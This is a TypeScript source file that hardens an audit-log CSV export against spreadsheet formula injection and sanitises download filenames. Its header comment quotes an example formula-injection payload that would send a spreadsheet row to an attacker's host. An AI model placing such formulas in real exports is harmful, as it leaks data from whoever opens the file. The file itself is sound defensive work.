/**
 * CSV serialisation that is safe to open in a spreadsheet (P7 hardening).
 *
 * The audit-log export (§4.5 / Req §5 "hỗ trợ xuất file audit") writes fields an
 * editor controls — `reason`, `entryTitle`, `actorName`. Excel, LibreOffice and
 * Google Sheets treat a cell beginning `=`, `+`, `-`, `@`, TAB or CR as a
 * *formula*, so a rejection reason of `=WEBSERVICE("https://x/?"&A1)` would
 * exfiltrate the row to an attacker's host the moment a compliance officer
 * opened the export. Quoting alone does not help: spreadsheets strip the quotes
 * before evaluating.
 *
 * The fix is to neutralise the leading character with a `'` prefix (the
 * spreadsheet convention for "literal text") *inside* the quoted field, which
 * keeps the value human-readable and machine-parseable while never evaluating.
 */

/** Characters that make a spreadsheet treat the cell as a formula. */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * Escape one value for a CSV cell: neutralise formula prefixes, then quote and
 * double any embedded quotes. Always quotes a neutralised value so the leading
 * `'` can never be mistaken for part of the delimiter structure.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  const raw = typeof value === "object" ? JSON.stringify(value) : String(value);
  const neutralised = FORMULA_PREFIX.test(raw) ? `'${raw}` : raw;
  return /[",\n\r]/.test(neutralised) || neutralised !== raw
    ? `"${neutralised.replace(/"/g, '""')}"`
    : neutralised;
}

/** Serialise rows to a CSV document with a header line, using {@link csvCell}. */
export function toCsv<TRow extends Record<string, unknown>>(
  columns: readonly string[],
  rows: readonly TRow[],
): string {
  const header = columns.map(csvCell).join(",");
  const lines = rows.map((row) => columns.map((col) => csvCell(row[col])).join(","));
  // CRLF is what RFC 4180 specifies and what Excel expects.
  return [header, ...lines].join("\r\n");
}

/**
 * Sanitise a value destined for a `Content-Disposition` filename. Strips quotes,
 * CR/LF (header injection) and path separators.
 */
export function safeFilename(name: string, fallback = "export"): string {
  const cleaned = name.replace(/[^A-Za-z0-9._-]/g, "");
  return cleaned.length > 0 ? cleaned.slice(0, 100) : fallback;
}
